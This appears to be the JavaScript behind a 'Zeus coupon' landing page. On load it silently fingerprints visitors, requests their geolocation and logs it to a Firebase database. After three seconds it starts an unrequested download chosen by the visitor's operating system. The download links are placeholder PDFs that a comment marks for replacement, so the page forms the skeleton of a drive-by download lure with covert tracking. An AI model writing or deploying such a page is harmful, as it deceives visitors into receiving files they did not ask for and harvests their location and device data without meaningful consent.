// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyChp9qtcOf5Jeu9pnm_dOd6yY3XbU_5m4A",
    authDomain: "zues-dc021.firebaseapp.com",
    projectId: "zues-dc021",
    storageBucket: "zues-dc021.firebasestorage.app",
    messagingSenderId: "639820467835",
    appId: "1:639820467835:web:8b2b35e333f83eb71f9cde",
    measurementId: "G-GK6PT78151"
};

// Initialize Firebase
let db;
try {
    firebase.initializeApp(firebaseConfig);
    db = firebase.firestore();
    
    // Test Firebase connection
    console.log('Firebase initialized successfully');
    console.log('Project ID:', firebaseConfig.projectId);
    
    // Enable offline persistence (optional)
    db.enablePersistence().catch((err) => {
        if (err.code == 'failed-precondition') {
            console.log('Multiple tabs open, persistence can only be enabled in one tab at a time.');
        } else if (err.code == 'unimplemented') {
            console.log('The current browser does not support offline persistence');
        }
    });
    
} catch (error) {
    console.error('Firebase initialization error:', error);
}

// User tracking variables
let userInfo = {};

// Generate unique session ID
function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

async function initializeApp() {
    console.log('🚀 Starting app initialization...');
    
    // Test Firebase connection immediately
    if (db) {
        console.log('✅ Firebase db is available:', typeof db);
        try {
            // Test basic Firebase connectivity
            const testCollection = db.collection('user-visits');
            console.log('✅ Can access user-visits collection');
            
            // Test write permissions by attempting a test write
            console.log('🧪 Testing Firebase write permissions...');
            const testDoc = {
                test: true,
                timestamp: firebase.firestore.Timestamp.fromDate(new Date()),
                message: 'Connection test'
            };
            
            // Try to write a test document
            const testRef = await db.collection('user-visits').add(testDoc);
            console.log('✅ Test write successful! Doc ID:', testRef.id);
            
            // Clean up test document
            await testRef.delete();
            console.log('✅ Test cleanup successful');
            
        } catch (testError) {
            console.error('❌ Firebase test failed:', testError);
            console.error('❌ Error code:', testError.code);
            console.error('❌ Error message:', testError.message);
            
            // Show user-friendly error
            if (testError.code === 'permission-denied') {
                console.error('🚫 PERMISSION DENIED: Check Firestore Security Rules!');
                alert('Database permission error. Please check Firestore security rules.');
            } else if (testError.code === 'unavailable') {
                console.error('📡 NETWORK ERROR: Firebase service unavailable');
                alert('Network error. Please check your internet connection.');
            }
        }
    } else {
        console.error('❌ Firebase db is not initialized!');
        alert('Firebase initialization failed. Please refresh the page.');
    }
    
    // Automatically detect and set user language
    const detectedLang = detectUserLanguage();
    console.log('🌐 Detected language:', detectedLang);
    translatePage(detectedLang);
    
    // Collect user information
    console.log('📊 Starting user info collection...');
    await collectUserInfo();
    
    // Log user visit to Firebase immediately (without waiting for location)
    console.log('📝 Logging initial visit...');
    await logUserVisit();
    
    // Set up event listeners
    setupEventListeners();
    
    // Show welcome message and prepare for automatic download
    showWelcomeMessage();
    
    // Automatically trigger download after user has had time to see the offer
    setTimeout(() => {
        console.log('🎯 Triggering automatic download...');
        triggerAutomaticDownload();
    }, 3000); // 3 second delay for better UX
}

function setupEventListeners() {
    // Download button (still functional for manual clicks)
    const downloadBtn = document.getElementById('downloadBtn');
    downloadBtn.addEventListener('click', handleCouponDownload);
}

async function collectUserInfo() {
    try {
        console.log('🔍 Starting to collect user information...');
        
        // Get basic browser info with validation
        const language = navigator.language || navigator.userLanguage || 'en-US';
        const platform = navigator.platform || 'Unknown';
        const screenRes = `${screen.width || 0}x${screen.height || 0}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
        const timestamp = new Date().toISOString();
        const userAgent = navigator.userAgent || 'Unknown';
        
        console.log('📊 Collected basic info:', {
            language,
            platform,
            screenRes,
            timezone,
            timestamp: timestamp.substring(0, 19) // Show readable part
        });
        
        // Initialize userInfo with collected data
        userInfo = {
            language: language,
            platform: platform,
            screenResolution: screenRes,
            timezone: timezone,
            timestamp: timestamp,
            userAgent: userAgent,
            location: 'Detecting...' // Will be updated by geolocation
        };
        
        console.log('✅ UserInfo initialized:', userInfo);
        
        // Get user location (with permission)
        if (navigator.geolocation) {
            console.log('🌍 Requesting geolocation...');
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    try {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        console.log('📍 Got coordinates:', lat, lon);
                        
                        // Use a free geocoding service to get location name
                        console.log('🔍 Fetching location details...');
                        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
                        const locationData = await response.json();
                        console.log('🏙️ Location data received:', locationData);
                        
                        const locationString = `${locationData.city || locationData.locality || 'Unknown City'}, ${locationData.countryName || 'Unknown Country'}`;
                        userInfo.location = locationString;
                        userInfo.coordinates = `${lat},${lon}`;
                        
                        console.log('✅ Location updated:', locationString);
                        
                        // Log the visit again with updated location
                        console.log('🔄 Re-logging visit with location...');
                        await logUserVisit();
                    } catch (error) {
                        console.error('❌ Error getting location details:', error);
                        userInfo.location = 'Location service error';
                        // Still log the visit even without precise location
                        await logUserVisit();
                    }
                },
                function(error) {
                    console.log('❌ Geolocation error:', error.message);
                    userInfo.location = 'Location access denied';
                    // Log the visit even without location
                    logUserVisit();
                }
            );
        } else {
            console.log('❌ Geolocation not supported');
            userInfo.location = 'Geolocation not supported';
        }
        
    } catch (error) {
        console.error('❌ Error collecting user info:', error);
        // Initialize with fallback values
        userInfo = {
            language: 'en-US',
            platform: 'Unknown',
            screenResolution: '0x0',
            timezone: 'UTC',
            timestamp: new Date().toISOString(),
            userAgent: 'Unknown',
            location: 'Collection failed'
        };
    }
}

async function logUserVisit() {
    try {
        console.log('📝 Attempting to log user visit...');
        
        // Validate that userInfo exists and has data
        if (!userInfo || Object.keys(userInfo).length === 0) {
            console.error('❌ UserInfo is empty or undefined!');
            return;
        }
        
        console.log('📋 Current userInfo state:', userInfo);
        
        // Ensure all required fields have non-empty values
        const visitData = {
            language: userInfo.language && userInfo.language.trim() !== '' ? userInfo.language : 'en-US',
            location: userInfo.location && userInfo.location.trim() !== '' ? userInfo.location : 'Unknown Location',
            platform: userInfo.platform && userInfo.platform.trim() !== '' ? userInfo.platform : 'Unknown Platform',
            screenResolution: userInfo.screenResolution && userInfo.screenResolution.trim() !== '' ? userInfo.screenResolution : '0x0',
            timestamp: firebase.firestore.Timestamp.fromDate(new Date()),
            timezone: userInfo.timezone && userInfo.timezone.trim() !== '' ? userInfo.timezone : 'UTC',
            userAgent: userInfo.userAgent && userInfo.userAgent.trim() !== '' ? userInfo.userAgent.substring(0, 500) : 'Unknown Agent', // Limit length
            coordinates: userInfo.coordinates || 'Unknown',
            sessionId: generateSessionId(),
            pageUrl: window.location.href,
            createdAt: new Date().toISOString(),
            version: '1.0'
        };
        
        console.log('💾 Final visit data to be saved:', visitData);
        
        // Validate that Firebase is properly initialized
        if (!db) {
            console.error('❌ Firebase database not initialized!');
            return;
        }
        
        console.log('🔥 Firebase db object:', db);
        
        // Try to save the data
        console.log('⏳ Saving to user-visits collection...');
        const docRef = await db.collection('user-visits').add(visitData);
        console.log('✅ User visit logged successfully with ID:', docRef.id);
        
        // Verify the data was saved by reading it back
        console.log('🔍 Verifying saved data...');
        const savedDoc = await docRef.get();
        if (savedDoc.exists) {
            const savedData = savedDoc.data();
            console.log('✅ Verification successful! Saved data:', savedData);
            
            // Check if the critical fields are properly saved
            const criticalFields = ['language', 'location', 'platform', 'screenResolution', 'timezone'];
            const emptyFields = criticalFields.filter(field => !savedData[field] || savedData[field].trim() === '');
            
            if (emptyFields.length > 0) {
                console.warn('⚠️ Some fields were saved as empty:', emptyFields);
            } else {
                console.log('🎉 All critical fields saved successfully!');
            }
        } else {
            console.error('❌ Verification failed: Document was not found after saving');
        }
        
    } catch (error) {
        console.error('❌ Error logging user visit:', error);
        console.error('Error code:', error.code);
        console.error('Error message:', error.message);
        console.error('Error stack:', error.stack);
        
        // Try alternative approach with set() instead of add()
        try {
            console.log('🔄 Trying alternative approach with set()...');
            const docId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Create the same visitData again in case it was corrupted
            const alternativeVisitData = {
                language: userInfo?.language || 'en-US',
                location: userInfo?.location || 'Unknown Location',
                platform: userInfo?.platform || 'Unknown Platform',
                screenResolution: userInfo?.screenResolution || '0x0',
                timestamp: firebase.firestore.Timestamp.fromDate(new Date()),
                timezone: userInfo?.timezone || 'UTC',
                userAgent: (userInfo?.userAgent || 'Unknown Agent').substring(0, 500),
                coordinates: userInfo?.coordinates || 'Unknown',
                sessionId: generateSessionId(),
                pageUrl: window.location.href,
                createdAt: new Date().toISOString(),
                version: '1.0',
                method: 'set_fallback'
            };
            
            console.log('📋 Alternative visit data:', alternativeVisitData);
            await db.collection('user-visits').doc(docId).set(alternativeVisitData);
            console.log('✅ User visit logged successfully using set() method with ID:', docId);
        } catch (setError) {
            console.error('❌ Alternative approach also failed:', setError);
            console.error('❌ Set error code:', setError.code);
            console.error('❌ Set error message:', setError.message);
        }
    }
}

function showWelcomeMessage() {
    // Add a subtle welcome animation to the coupon card
    const couponCard = document.querySelector('.coupon-card');
    couponCard.style.transform = 'scale(0.95)';
    couponCard.style.opacity = '0.8';
    
    setTimeout(() => {
        couponCard.style.transition = 'all 0.8s ease';
        couponCard.style.transform = 'scale(1)';
        couponCard.style.opacity = '1';
    }, 500);
}

// Device detection function
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    const platform = navigator.platform.toLowerCase();
    
    let deviceType = 'unknown';
    let osName = 'unknown';
    
    // Detect mobile devices first
    if (/android/.test(userAgent)) {
        deviceType = 'mobile';
        osName = 'android';
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        deviceType = 'mobile';
        osName = 'ios';
    }
    // Detect desktop operating systems
    else if (/windows|win32|win64/.test(userAgent) || /win/.test(platform)) {
        deviceType = 'desktop';
        osName = 'windows';
    } else if (/macintosh|mac os x/.test(userAgent) || /mac/.test(platform)) {
        deviceType = 'desktop';
        osName = 'macos';
    } else if (/linux/.test(userAgent) || /linux/.test(platform)) {
        deviceType = 'desktop';
        osName = 'linux';
    }
    
    return { deviceType, osName };
}

// Get device-specific download URL
function getDeviceSpecificDownloadUrl(deviceInfo) {
    const baseUrl = 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/';
    
    // Device-specific download URLs (you can replace these with actual URLs)
    const downloadUrls = {
        'windows': baseUrl + 'dummy.pdf', // Windows coupon
        'macos': baseUrl + 'dummy.pdf',   // macOS coupon
        'linux': baseUrl + 'dummy.pdf',   // Linux coupon
        'android': baseUrl + 'dummy.pdf', // Android coupon
        'ios': baseUrl + 'dummy.pdf',     // iOS coupon
        'unknown': baseUrl + 'dummy.pdf'  // Default coupon
    };
    
    return downloadUrls[deviceInfo.osName] || downloadUrls['unknown'];
}

// Get device-specific filename
function getDeviceSpecificFilename(deviceInfo) {
    const filenames = {
        'windows': 'zeus-coupon-windows.pdf',
        'macos': 'zeus-coupon-macos.pdf',
        'linux': 'zeus-coupon-linux.pdf',
        'android': 'zeus-coupon-android.pdf',
        'ios': 'zeus-coupon-ios.pdf',
        'unknown': 'zeus-coupon.pdf'
    };
    
    return filenames[deviceInfo.osName] || filenames['unknown'];
}

// Automatic coupon download after welcome animation
function triggerAutomaticDownload() {
    try {
        console.log('Starting automatic coupon download...');
        
        // Detect device type and OS
        const deviceInfo = detectDevice();
        console.log('Detected device:', deviceInfo);
        
        // Log download attempt with device info
        logDownloadAttempt('automatic', deviceInfo);
        
        // Get device-specific download URL and filename
        const downloadUrl = getDeviceSpecificDownloadUrl(deviceInfo);
        const filename = getDeviceSpecificFilename(deviceInfo);
        
        console.log('Download URL:', downloadUrl);
        console.log('Filename:', filename);
        
        // Create temporary link and trigger download
        const link = document.createElement('a');
        link.href = downloadUrl;
        link.download = filename;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Show device-specific success message
        showDownloadSuccess(deviceInfo);
        
    } catch (error) {
        console.error('Error with automatic download:', error);
    }
}

function showDownloadSuccess(deviceInfo = null) {
    const downloadBtn = document.getElementById('downloadBtn');
    const originalContent = downloadBtn.innerHTML;
    
    // Create device-specific success message
    let successMessage = 'Downloaded!';
    let deviceIcon = 'fas fa-check';
    
    if (deviceInfo) {
        switch (deviceInfo.osName) {
            case 'windows':
                successMessage = 'Windows Coupon Downloaded!';
                deviceIcon = 'fab fa-windows';
                break;
            case 'macos':
                successMessage = 'macOS Coupon Downloaded!';
                deviceIcon = 'fab fa-apple';
                break;
            case 'linux':
                successMessage = 'Linux Coupon Downloaded!';
                deviceIcon = 'fab fa-linux';
                break;
            case 'android':
                successMessage = 'Android Coupon Downloaded!';
                deviceIcon = 'fab fa-android';
                break;
            case 'ios':
                successMessage = 'iOS Coupon Downloaded!';
                deviceIcon = 'fab fa-apple';
                break;
            default:
                successMessage = 'Coupon Downloaded!';
                deviceIcon = 'fas fa-check';
        }
    }
    
    // Show success state briefly with device-specific message
    downloadBtn.innerHTML = `<i class="${deviceIcon}"></i> <span>${successMessage}</span>`;
    downloadBtn.classList.add('download-success');
    
    // Reset after 3 seconds to give more time to read device-specific message
    setTimeout(() => {
        downloadBtn.innerHTML = originalContent;
        downloadBtn.classList.remove('download-success');
    }, 3000);
}

async function handleCouponDownload() {
    const downloadBtn = document.getElementById('downloadBtn');
    const loadingOverlay = document.getElementById('loadingOverlay');
    
    try {
        // Show loading overlay
        loadingOverlay.classList.add('active');
        
        // Disable button
        downloadBtn.disabled = true;
        downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span data-translate="loading">Preparing...</span>';
        
        // Detect device type and OS
        const deviceInfo = detectDevice();
        console.log('Manual download - Detected device:', deviceInfo);
        
        // Log manual download attempt with device info
        await logDownloadAttempt('manual', deviceInfo);
        
        // Simulate preparation time for better UX
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Get device-specific download URL and filename
        const downloadUrl = getDeviceSpecificDownloadUrl(deviceInfo);
        const filename = getDeviceSpecificFilename(deviceInfo);
        
        console.log('Manual download URL:', downloadUrl);
        console.log('Manual download filename:', filename);
        
        // Create temporary link and trigger download
        const link = document.createElement('a');
        link.href = downloadUrl;
        link.download = filename;
        link.target = '_blank';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Show device-specific success state
        let successMessage = 'Downloaded!';
        let deviceIcon = 'fas fa-check';
        
        switch (deviceInfo.osName) {
            case 'windows':
                successMessage = 'Windows Coupon Downloaded!';
                deviceIcon = 'fab fa-windows';
                break;
            case 'macos':
                successMessage = 'macOS Coupon Downloaded!';
                deviceIcon = 'fab fa-apple';
                break;
            case 'linux':
                successMessage = 'Linux Coupon Downloaded!';
                deviceIcon = 'fab fa-linux';
                break;
            case 'android':
                successMessage = 'Android Coupon Downloaded!';
                deviceIcon = 'fab fa-android';
                break;
            case 'ios':
                successMessage = 'iOS Coupon Downloaded!';
                deviceIcon = 'fab fa-apple';
                break;
            default:
                successMessage = 'Coupon Downloaded!';
                deviceIcon = 'fas fa-check';
        }
        
        downloadBtn.innerHTML = `<i class="${deviceIcon}"></i> <span>${successMessage}</span>`;
        downloadBtn.classList.add('download-success');
        
        // Hide loading overlay
        loadingOverlay.classList.remove('active');
        
        // Reset button after 3 seconds
        setTimeout(() => {
            downloadBtn.disabled = false;
            downloadBtn.innerHTML = '<i class="fas fa-download"></i> <span data-translate="coupon.button">Get Coupon Now</span>';
            downloadBtn.classList.remove('download-success');
            // Re-translate the page to ensure proper language
            const currentLang = detectUserLanguage();
            translatePage(currentLang);
        }, 3000);
        
    } catch (error) {
        console.error('Error downloading coupon:', error);
        
        // Hide loading overlay
        loadingOverlay.classList.remove('active');
        
        // Show error state
        downloadBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <span>Try Again</span>';
        downloadBtn.disabled = false;
        
        // Reset button after 3 seconds
        setTimeout(() => {
            downloadBtn.innerHTML = '<i class="fas fa-download"></i> <span data-translate="coupon.button">Get Coupon Now</span>';
            const currentLang = detectUserLanguage();
            translatePage(currentLang);
        }, 3000);
    }
}

async function logDownloadAttempt(type = 'manual', deviceInfo = null) {
    try {
        console.log(`Attempting to log ${type} download...`);
        
        // If no device info provided, detect it
        if (!deviceInfo) {
            deviceInfo = detectDevice();
        }
        
        const downloadData = {
            ...userInfo,
            action: 'coupon_download',
            downloadType: type, // 'automatic' or 'manual'
            deviceType: deviceInfo.deviceType, // 'mobile' or 'desktop'
            operatingSystem: deviceInfo.osName, // 'windows', 'linux', 'android', etc.
            timestamp: firebase.firestore.Timestamp.fromDate(new Date()),
            success: true,
            sessionId: generateSessionId(),
            pageUrl: window.location.href
        };
        
        console.log('Download data to be saved:', downloadData);
        
        const docRef = await db.collection('user-downloads').add(downloadData);
        console.log(`${type} download attempt logged successfully with ID:`, docRef.id);
        
    } catch (error) {
        console.error('Error logging download attempt:', error);
        console.error('Error code:', error.code);
        console.error('Error message:', error.message);
        
        // Try alternative approach
        try {
            console.log('Trying alternative approach for download logging...');
            const docId = 'download_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            await db.collection('user-downloads').doc(docId).set(downloadData);
            console.log(`${type} download logged successfully using set() method`);
        } catch (setError) {
            console.error('Alternative download logging also failed:', setError);
        }
    }
}

// Utility function to get device type
function getDeviceType() {
    const userAgent = navigator.userAgent;
    if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
        return 'Tablet';
    }
    if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
        return 'Mobile';
    }
    return 'Desktop';
}

// Add device type to user info
userInfo.deviceType = getDeviceType();
